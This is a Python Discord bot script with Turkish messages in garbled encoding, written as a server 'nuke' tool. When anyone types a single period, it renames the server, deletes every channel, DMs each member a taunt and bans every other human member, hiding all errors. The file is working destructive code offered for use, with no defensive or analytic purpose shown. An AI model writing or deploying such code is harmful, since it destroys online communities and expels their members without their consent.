import os
import discord
from discord.ext import commands

TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"âœ… Bot aktif: {bot.user.name}")

@bot.event
async def on_message(message):
    if message.author == bot.user or not message.guild:
        return

    if message.content.strip() == ".":
        guild = message.guild

        try:
            await message.channel.send("ğŸš¨ **Maymunlar serbest bÄ±rakÄ±ldÄ±!** Sunucu temizlik operasyonu baÅŸlÄ±yor... ğŸ’ğŸ’¥")
        except: pass

        try:
            await guild.edit(name="Maymun Sunucusu ğŸµ")
        except: pass

        for channel in list(guild.channels):
            try:
                await channel.delete()
            except: pass

        for member in guild.members:
            if member != message.author and not member.bot:
                try:
                    dm = await member.create_dm()
                    await dm.send("ğŸ’ Maymunlar size skrim yapÄ±yor! ğŸ”¥")
                except: pass
                try:
                    await member.ban(reason="Maymun istilasÄ± nedeniyle uzaklaÅŸtÄ±rÄ±ldÄ±")
                except: pass

    await bot.process_commands(message)